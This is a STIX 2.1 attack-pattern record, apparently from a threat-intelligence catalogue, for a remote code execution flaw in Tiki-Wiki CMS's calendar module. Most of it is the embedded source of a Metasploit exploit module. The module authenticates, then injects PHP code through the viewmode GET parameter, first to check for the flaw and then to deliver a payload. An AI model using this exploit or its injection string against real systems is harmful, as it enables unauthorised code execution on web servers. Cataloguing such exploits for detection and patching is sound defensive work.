{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9dc63371-d514-4648-acd9-4e33e71dac59",
    "created": "2024-08-14T17:01:01.775246Z",
    "modified": "2024-08-14T17:01:01.77525Z",
    "name": "Tiki-Wiki CMS Calendar Command Execution",
    "description": "( Tiki-Wiki CMS's calendar module contains a remote code execution vulnerability within the viewmode GET parameter. The calendar module is NOT enabled by default.  If enabled the default permissions are set to NOT allow anonymous users to access.  Vulnerable versions: <=14.1, <=12.4 LTS, <=9.10 LTS and <=6.14 Verified/Tested against 14.1 )",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/tiki_calendar_exec.rb",
            "external_id": "tiki_calendar_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "https://tiki.org/article414-Important-Security-Fix-for-all-versions-of-Tiki"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name'        => 'Tiki-Wiki CMS Calendar Command Execution',\n        'Description' => %q(\n          Tiki-Wiki CMS's calendar module contains a remote code execution\n          vulnerability within the viewmode GET parameter.\n          The calendar module is NOT enabled by default.  If enabled,\n          the default permissions are set to NOT allow anonymous users\n          to access.\n\n          Vulnerable versions: <=14.1, <=12.4 LTS, <=9.10 LTS and <=6.14\n          Verified/Tested against 14.1\n        ),\n        'Author'      =>\n          [\n            'h00die <mike@shorebreaksecurity.com>', # module\n            'Dany Ouellet'                          # discovery\n          ],\n        'References'  =>\n          [\n            [ 'EDB', '39965' ],\n            [ 'URL', 'https://tiki.org/article414-Important-Security-Fix-for-all-versions-of-Tiki']\n          ],\n        'License'        => MSF_LICENSE,\n        'Platform'       => %w( php ),\n        'Privileged'     => false,\n        'Arch'           => ARCH_PHP,\n        'Targets'        =>\n          [\n            [ 'Automatic Target', {}]\n          ],\n        'DefaultTarget' => 0,\n        'DisclosureDate' => '2016-06-06'\n      )\n    )\n\n    register_options(\n      [\n        Opt::RPORT(80),\n        OptString.new('TARGETURI', [ true, 'The URI of Tiki-Wiki', '/']),\n        OptString.new('USERNAME',  [ true, 'Username of a user with calendar access', 'admin']),\n        OptString.new('PASSWORD',  [ true, 'Password of a user with calendar access', 'admin'])\n      ], self.class\n    )\n  end\n\n  # returns cookie regardless of outcome\n  def authenticate\n    begin\n      # get a cookie to start with\n      res = send_request_cgi(\n        'uri'       => normalize_uri(target_uri.path, 'tiki-login_scr.php'),\n        'method'    => 'GET'\n      )\n\n      if res && res.code == 404\n        fail_with(Failure::Unknown, 'Target does not have tiki-login_scr.php')\n      end\n\n      cookie = res ? res.get_cookies : ''\n      # if we have creds, login with them\n      vprint_status('Attempting Login')\n      # the bang on the cgi will follow the redirect we receive on a good login\n      res = send_request_cgi!(\n        'uri'       => normalize_uri(target_uri.path, 'tiki-login.php'),\n        'method'    => 'POST',\n        'ctype'     => 'application/x-www-form-urlencoded',\n        'cookie'    => cookie,\n        'vars_post' =>\n          {\n            'user'                     => datastore['USERNAME'],\n            'pass'                     => datastore['PASSWORD'],\n            'login'                    => '',\n            'stay_in_ssl_mode_present' => 'y',\n            'stay_in_ssl_mode'         => 'n'\n          }\n      )\n      # double check auth worked and we got a Log out on the page.\n      # at times I got it to auth, but then it would give permission errors\n      # so we want to try to double check everything is good\n      if res && res.body !~ /Log out/\n        fail_with(Failure::UnexpectedReply, \"#{peer} Login Failed with #{datastore['USERNAME']}:#{datastore['PASSWORD']}\")\n      end\n      vprint_good(\"Login Successful\")\n      return cookie\n    rescue ::Rex::ConnectionError\n      fail_with(Failure::Unreachable, \"#{peer} - Could not connect to the web service\")\n    end\n  end\n\n  # sends the calendar packet, returns the HTTP response\n  def send_calendar_packet(cookie, data)\n    begin\n      return send_request_cgi(\n        'uri'       => normalize_uri(target_uri.path, 'tiki-calendar.php'),\n        'method'    => 'GET',\n        'cookie'    => cookie,\n        'vars_get'  =>\n        {\n          'viewmode'   => \"';#{data};$a='\"\n        }\n      )\n    rescue ::Rex::ConnectionError\n      fail_with(Failure::Unreachable, \"#{peer} - Could not connect to the web service\")\n    end\n  end\n\n  # Version numbers are post auth, so we send a print statement w/\n  # 10 random characters and check for it in the response\n  def check\n    if datastore['USERNAME'] && !datastore['USERNAME'].blank?\n      cookie = authenticate\n    end\n\n    flag = Rex::Text.rand_text_alpha(10)\n    res = send_calendar_packet(cookie, \"print(#{flag})\")\n\n    if res\n      if res.body =~ /You do not have permission to view the calendar/i\n        fail_with(Failure::NoAccess, \"#{peer} - Additional Permissions Required\")\n      elsif res.body =~ />#{flag}</\n        Exploit::CheckCode::Vulnerable\n      else\n        Exploit::CheckCode::Safe\n      end\n    end\n  end\n\n  def exploit\n    if datastore['USERNAME'] && !datastore['USERNAME'].blank?\n      cookie = authenticate\n    end\n\n    vprint_status('Sending malicious calendar view packet')\n    res = send_calendar_packet(cookie, payload.encoded)\n    if res && res.body =~ /You do not have permission to view the calendar/i\n      fail_with(Failure::NoAccess, \"#{peer} - Additional Permissions Required\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2016-06-06",
    "x_mitre_platforms": [
        "%w( php )"
    ]
}